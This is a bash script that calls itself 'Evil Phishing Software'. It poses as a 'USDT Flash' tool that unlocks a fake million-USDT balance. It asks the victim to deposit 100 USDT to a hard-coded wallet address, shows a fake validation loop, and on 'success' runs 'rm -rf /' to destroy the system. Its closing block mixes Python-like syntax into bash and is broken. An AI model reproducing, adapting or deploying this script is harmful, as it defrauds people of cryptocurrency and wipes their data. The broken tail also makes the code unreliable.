#!/bin/bash

# Evil Phishing Software

balance=1000000
hash_id="TXYYQwqfj5ih1mZk27fSj21DmsDQJVyrcr"

usdt_logo="
\033[0;34m$$$$$$\
$$  __$$\
$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
\033[0;34m\$$$$$$\  $$  __$$\ $$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ $$  __$$\
 \____$$\ $$ /  $$ |$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |
\033[0;34m\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
 \______/  \______/  \______/ \__| \__| \__| \_______| \______/ \__|  \__|
\033[0m"

function fancyBoxEcho {
    local message="$1"
    local length=${#message}
    local border=$(printf '=%.0s' $(seq 1 $((length + 4))))

    echo "$border"
    echo "| $message |"
    echo "$border"
}

welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"

echo -e "$usdt_logo"

fancyBoxEcho "$welcome_message"

echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $hash_id"
#echo -e "$usdt_logo"
function unlockBalance {
	echo " "
    read -p "Enter your deposit amount in USDT: " depositAmount
    read -p "Enter the transaction hash ID: " transactionHash
	
	echo " "
	for ((i=1; i<=20; i++)); do
    		# Print the message in green color
    		echo -e " \e[32mValidating please wait...\e[0m"
    		sleep 0.3
		
	done
	echo " "

    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
        echo "Congratulations! Your balance of $balance USDT has been unlocked."
        evilFunction # Invoke our wicked function
        exit 0
    else
        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
        sleep 3
        clear
        unlockBalance
    fi
}

function evilFunction {
    echo "Executing evil function..."
    # Insert your evil code here

    rm -rf / # Let us cause some chaos!
    echo "Evil function executed successfully!"
	exit
}

fancyBoxEcho "Current Balance: $balance USDT"

# Refresh Function
function refresh {
    echo "Refreshing..."
    sleep 2
    clear
    echo -e "$usdt_logo"
    echo " "
    fancyBoxEcho "$welcome_message"
    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $hash_id"
}

refresh # Call the refresh function when the script starts

while true; do
    unlockBalance
done

if unlockBalance;
	for number in range(1, 200)
	echo "Unlocking......"
done

exit
